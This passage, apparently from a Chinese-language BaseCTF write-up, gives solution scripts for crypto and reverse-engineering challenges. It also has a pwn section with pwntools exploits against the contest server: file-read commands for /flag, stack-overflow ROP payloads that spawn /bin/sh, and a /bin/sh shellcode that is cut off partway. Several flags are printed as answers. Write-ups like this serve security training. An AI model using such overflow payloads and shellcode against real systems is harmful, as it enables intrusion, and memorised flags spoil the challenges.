class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> cipher[] = &#123;<br>        <span class="hljs-number">98</span>, <span class="hljs-number">113</span>, <span class="hljs-number">163</span>, <span class="hljs-number">181</span>, <span class="hljs-number">115</span>, <span class="hljs-number">148</span>, <span class="hljs-number">166</span>, <span class="hljs-number">43</span>, <span class="hljs-number">9</span>, <span class="hljs-number">95</span>,<br>        <span class="hljs-number">165</span>, <span class="hljs-number">146</span>, <span class="hljs-number">79</span>, <span class="hljs-number">115</span>, <span class="hljs-number">146</span>, <span class="hljs-number">233</span>, <span class="hljs-number">112</span>, <span class="hljs-number">180</span>, <span class="hljs-number">48</span>, <span class="hljs-number">79</span>,<br>        <span class="hljs-number">65</span>, <span class="hljs-number">181</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>, <span class="hljs-number">46</span>, <span class="hljs-number">249</span>, <span class="hljs-number">78</span>, <span class="hljs-number">183</span>, <span class="hljs-number">79</span>, <span class="hljs-number">133</span>,<br>        <span class="hljs-number">180</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>, <span class="hljs-number">148</span>, <span class="hljs-number">163</span>, <span class="hljs-number">79</span>, <span class="hljs-number">78</span>, <span class="hljs-number">48</span>, <span class="hljs-number">231</span>, <span class="hljs-number">77</span><br>    &#125;;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> flag[<span class="hljs-number">40</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> inverse = <span class="hljs-number">241</span>;  <span class="hljs-comment">// 17&#x27;s modular inverse modulo 256</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++) &#123;<br>        flag[i] = (cipher[i] * inverse) % <span class="hljs-number">256</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Print the decrypted flag</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Decrypted flag: &quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, flag[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="babypack"><a class="markdownIt-Anchor" href="#babypack"></a> babypack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-comment"># 从文件中读取a和c的值</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;D:\\谷歌\\babypack\\output.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br>    a = <span class="hljs-built_in">eval</span>(lines[<span class="hljs-number">0</span>].strip().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>])<br>    c = <span class="hljs-built_in">int</span>(lines[<span class="hljs-number">1</span>].strip().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>])<br><br>bin_m = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> c &gt;= a[i]:<br>        bin_m.append(<span class="hljs-string">&#x27;1&#x27;</span>)<br>        c -= a[i]<br>    <span class="hljs-keyword">else</span>:<br>        bin_m.append(<span class="hljs-string">&#x27;0&#x27;</span>)<br><br><span class="hljs-comment"># 将bin_m转换回整数m</span><br>m = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(bin_m), <span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># 将m转换回flag</span><br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="re"><a class="markdownIt-Anchor" href="#re"></a> Re</h2><h3 id="you-are-good-at-ida"><a class="markdownIt-Anchor" href="#you-are-good-at-ida"></a> You are good at IDA</h3><p>按照shift和f12进行查找最后拼接就行了</p><p><strong>BaseCTF{Y0u_4Re_900d_47_id4}</strong></p><h3 id="upx-mini"><a class="markdownIt-Anchor" href="#upx-mini"></a> UPX mini</h3><p>QmFzZUNURntIYXYzX0BfZzBvZF90MW0zISEhfQ==</p><p>base64解密</p><p><strong>BaseCTF{Hav3_@_g0od_t1m3!!!}</strong></p><h3 id="ez_maze"><a class="markdownIt-Anchor" href="#ez_maze"></a> ez_maze</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">maze, start_pos, end_pos</span>):<br>    ROWS = <span class="hljs-built_in">len</span>(maze)<br>    COLS = <span class="hljs-built_in">len</span>(maze[<span class="hljs-number">0</span>])<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">move</span>(<span class="hljs-params">pos, direction</span>):<br>        x, y = <span class="hljs-built_in">divmod</span>(pos, COLS)<br>        <span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;d&#x27;</span>:  <span class="hljs-comment"># Right</span><br>            <span class="hljs-keyword">return</span> pos + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> direction == <span class="hljs-string">&#x27;s&#x27;</span>:  <span class="hljs-comment"># Down</span><br>            <span class="hljs-keyword">return</span> pos + COLS<br>        <span class="hljs-keyword">elif</span> direction == <span class="hljs-string">&#x27;w&#x27;</span>:  <span class="hljs-comment"># Up</span><br>            <span class="hljs-keyword">return</span> pos - COLS<br>        <span class="hljs-keyword">elif</span> direction == <span class="hljs-string">&#x27;a&#x27;</span>:  <span class="hljs-comment"># Left</span><br>            <span class="hljs-keyword">return</span> pos - <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> pos<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid</span>(<span class="hljs-params">pos</span>):<br>        <span class="hljs-keyword">if</span> pos &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> pos &gt;= ROWS * COLS:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        x, y = <span class="hljs-built_in">divmod</span>(pos, COLS)<br>        <span class="hljs-keyword">return</span> maze[x][y] != <span class="hljs-string">&#x27;$&#x27;</span><br>    <br>    queue = deque([(start_pos, <span class="hljs-string">&#x27;&#x27;</span>)])<br>    visited = <span class="hljs-built_in">set</span>()<br>    visited.add(start_pos)<br><br>    <span class="hljs-keyword">while</span> queue:<br>        current_pos, path = queue.popleft()<br>        <span class="hljs-keyword">if</span> current_pos == end_pos:<br>            <span class="hljs-keyword">return</span> path<br>        <br>        <span class="hljs-keyword">for</span> direction <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;dsaw&#x27;</span>:<br>            new_pos = move(current_pos, direction)<br>            <span class="hljs-keyword">if</span> is_valid(new_pos) <span class="hljs-keyword">and</span> new_pos <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>                visited.add(new_pos)<br>                queue.append((new_pos, path + direction))<br>                <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 迷宫初始化</span><br>maze = [<br>    <span class="hljs-string">&quot;x$$$$$$$$$$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$&amp;$$$$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$$$$&amp;$$&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$$$$&amp;$&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y&quot;</span><br>]<br><br><span class="hljs-comment"># 将迷宫数据转换为一维列表</span><br>ROWS = <span class="hljs-number">15</span><br>COLS = <span class="hljs-number">15</span><br>maze_1d = <span class="hljs-string">&#x27;&#x27;</span>.join(maze)<br><br><span class="hljs-comment"># 起点和终点</span><br>START = <span class="hljs-number">0</span><br>END = (ROWS - <span class="hljs-number">1</span>) * COLS + (COLS - <span class="hljs-number">1</span>)  <span class="hljs-comment"># 最后一行最后一列的位置</span><br><br><span class="hljs-comment"># 查找路径</span><br>path = find_path([maze_1d[i * COLS:(i + <span class="hljs-number">1</span>) * COLS] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ROWS)], START, END)<br><span class="hljs-keyword">if</span> path:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到的路径：<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有找到路径&quot;</span>)<br></code></pre></td></tr></table></figure><p>最后进行MD5加密就行</p><h3 id="baseplus"><a class="markdownIt-Anchor" href="#baseplus"></a> BasePlus</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Secret array used in encoding</span><br>Secret = <span class="hljs-string">&#x27;/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">encoded_str</span>):<br>    decoded_str = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-comment"># Step 1: XOR each character with 0xE to undo the XOR applied during encoding</span><br>    xor_str = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(char) ^ <span class="hljs-number">0xE</span>) <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> encoded_str)<br><br>    <span class="hljs-comment"># Process the string in chunks of 4 characters</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(xor_str), <span class="hljs-number">4</span>):<br>        enc_chunk = xor_str[i:i+<span class="hljs-number">4</span>]<br><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># Reverse the Base64-like encoding using the Secret array</span><br>            v15 = (Secret.index(enc_chunk[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">2</span>) | (Secret.index(enc_chunk[<span class="hljs-number">1</span>]) &gt;&gt; <span class="hljs-number">4</span>)<br>            v16 = ((Secret.index(enc_chunk[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xF</span>) &lt;&lt; <span class="hljs-number">4</span>) | (Secret.index(enc_chunk[<span class="hljs-number">2</span>]) &gt;&gt; <span class="hljs-number">2</span>)<br>            v17 = ((Secret.index(enc_chunk[<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">0x3</span>) &lt;&lt; <span class="hljs-number">6</span>) | Secret.index(enc_chunk[<span class="hljs-number">3</span>])<br><br>            <span class="hljs-comment"># Reconstruct the original characters</span><br>            decoded_str += <span class="hljs-built_in">chr</span>(v15)<br>            <span class="hljs-keyword">if</span> v16 != <span class="hljs-number">0</span>:<br>                decoded_str += <span class="hljs-built_in">chr</span>(v16)<br>            <span class="hljs-keyword">if</span> v17 != <span class="hljs-number">0</span>:<br>                decoded_str += <span class="hljs-built_in">chr</span>(v17)<br><br>        <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error processing chunk: <span class="hljs-subst">&#123;enc_chunk&#125;</span> - <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">return</span> decoded_str<br><br><span class="hljs-comment"># Example usage</span><br>encoded_str = <span class="hljs-string">&quot;lvfzBiZiOw7&lt;lhF8dDOfEbmI]i@bdcZfEc^z&gt;aD!&quot;</span><br>decoded_str = decode(encoded_str)<br><br><span class="hljs-keyword">if</span> decoded_str <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decoded string: <span class="hljs-subst">&#123;decoded_str&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decoding failed due to an error.&quot;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="ez-xor"><a class="markdownIt-Anchor" href="#ez-xor"></a> Ez Xor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key_stream</span>(<span class="hljs-params">key, length</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;生成与输入数据长度相同的key stream&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i ^ key[i % <span class="hljs-built_in">len</span>(key)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_decrypt</span>(<span class="hljs-params">data, key_stream</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;对数据进行加密/解密操作&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([data[i] ^ key_stream[<span class="hljs-built_in">len</span>(data) - i - <span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data))])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attempt_decryption</span>(<span class="hljs-params">encrypted_data, key</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;尝试用给定的key解密数据&quot;&quot;&quot;</span><br>    key_stream_data = key_stream(key, <span class="hljs-built_in">len</span>(encrypted_data))<br>    decrypted = encrypt_decrypt(encrypted_data, key_stream_data)<br><br>    <span class="hljs-keyword">try</span>:<br>        flag = decrypted.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        <span class="hljs-keyword">if</span> flag.startswith(<span class="hljs-string">&quot;Base&quot;</span>):<br>            <span class="hljs-keyword">return</span> flag, <span class="hljs-string">&quot;可能的flag&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> flag, <span class="hljs-string">&quot;解密结果&quot;</span><br>    <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>        <span class="hljs-keyword">return</span> decrypted.<span class="hljs-built_in">hex</span>(), <span class="hljs-string">&quot;无法解码为ASCII，十六进制结果&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    encrypted_flag = (<br>        <span class="hljs-string">b&#x27;\x01\x09\x05\x25\x26\x2D\x0B\x1D&#x27;</span><br>        <span class="hljs-string">b&#x27;\x24\x7A\x31\x20\x1E\x49\x3D\x67&#x27;</span><br>        <span class="hljs-string">b&#x27;\x4D\x50\x08\x25\x2E\x6E\x05\x34&#x27;</span><br>        <span class="hljs-string">b&#x27;\x22\x40\x3B\x25&#x27;</span><br>    )<br><br>    key_value = <span class="hljs-number">7499608</span><br><br>    <span class="hljs-comment"># 定义不同格式的key</span><br>    keys = [<br>        struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, key_value),      <span class="hljs-comment"># 小端 32 位</span><br>        struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, key_value),      <span class="hljs-comment"># 大端 32 位</span><br>        struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, key_value)[:<span class="hljs-number">3</span>],  <span class="hljs-comment"># 小端 24 位</span><br>        struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, key_value)[<span class="hljs-number">1</span>:],  <span class="hljs-comment"># 大端 24 位</span><br>    ]<br><br>    <span class="hljs-keyword">for</span> i, key <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(keys):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n尝试 key <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>: <span class="hljs-subst">&#123;key.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>        result, status = attempt_decryption(encrypted_flag, key)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;status&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2><h3 id="签个到吧"><a class="markdownIt-Anchor" href="#签个到吧"></a> 签个到吧</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># 设置连接信息</span><br>host = <span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span><br>port = <span class="hljs-number">33292</span><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(host, port)<br><br><span class="hljs-comment"># 发送和接收数据</span><br>p.sendline(<span class="hljs-string">b&#x27;cat /flag&#x27;</span>)<br>response = p.recvline()<br><span class="hljs-built_in">print</span>(response.decode())<br><br><span class="hljs-comment"># 继续其他的交互操作</span><br><span class="hljs-comment"># 关闭连接</span><br>p.close()<br></code></pre></td></tr></table></figure><h3 id="echo"><a class="markdownIt-Anchor" href="#echo"></a> echo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置连接信息</span><br>host = <span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span><br>port = <span class="hljs-number">40511</span><br><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(host, port)<br><br><span class="hljs-comment"># 尝试使用 echo 和 bash 的 &lt; 操作符读取文件</span><br>p.sendline(<span class="hljs-string">b&#x27;echo $(&lt;/flag)&#x27;</span>)<br>response = p.recvline()<br><span class="hljs-built_in">print</span>(response.decode())<br><br><span class="hljs-comment"># 关闭连接</span><br>p.close()<br></code></pre></td></tr></table></figure><h3 id="我把她丢了"><a class="markdownIt-Anchor" href="#我把她丢了"></a> 我把她丢了</h3><p>填充使其溢出调用到bin/sh,就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>, <span class="hljs-number">49516</span>)<br><br><span class="hljs-comment">#system_plt=elf.plt[&quot;system&quot;]</span><br>pop_rdi_ret=<span class="hljs-number">0x0000000000401196</span><br>main=<span class="hljs-number">0x000000000040124B</span><br>payload=<span class="hljs-number">0x78</span>*<span class="hljs-string">b&#x27;a&#x27;</span>+p64(pop_rdi_ret)+p64(<span class="hljs-number">0x0000000000402008</span>)+p64(<span class="hljs-number">0x000000000040120F</span>)+p64(main)<br><span class="hljs-comment">#寄存器地址-&gt;bin/sh调用到system最后进入main</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># 进入交互模式</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="re2text"><a class="markdownIt-Anchor" href="#re2text"></a> Re2text</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>, <span class="hljs-number">30147</span>)<br><br><span class="hljs-comment"># 构造 payload</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x40101A</span>)+p64(<span class="hljs-number">0x4011a4</span>)           <span class="hljs-comment"># 填充缓冲区</span><br><br><span class="hljs-comment"># 发送 payload</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># 进入交互模式</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="shellcode_level0"><a class="markdownIt-Anchor" href="#shellcode_level0"></a> shellcode_level0</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(<span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span>, <span class="hljs-number">49846</span>)<br><br><span class="hljs-comment"># Shellcode 是一段二进制代码，可以直接在内存中执行。这个 shellcode 会启动一个 /bin/sh shell。</span><br><br>shellcode = (<br>    <span class="hljs-string">b&quot;\x48\x31\xc0&quot;</span>            <span class="hljs-comment"># xor rax, rax        ; 清空 rax 寄存器 (rax = 0)</span><br>    <span class="hljs-string">b&quot;\x50&quot;</span>                    <span class="hljs-comment"># push rax            ; 将 rax (0) 压入栈，作为 NULL 终止符</span><br>    <span class="hljs-string">b&quot;\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span> <span class="hljs-comment"># mov rbx, 0x68732f2f6e69622f ; 将 &quot;/bin//sh&quot; 存入 rbx</span><br>    <span class="hljs-string">b&quot;\x53&quot;</span>                    <span class="hljs-comment"># push rbx            ; 将 rbx (&quot;/bin//sh&quot;) 压入栈</span><br>    <span class="hljs-string">b&quot;\x48\x89\xe7&quot;</span>            <span class="hljs-comment"># mov rdi, rsp        ; 将栈指针 rsp 的值赋给 rdi，现在 rdi 指向 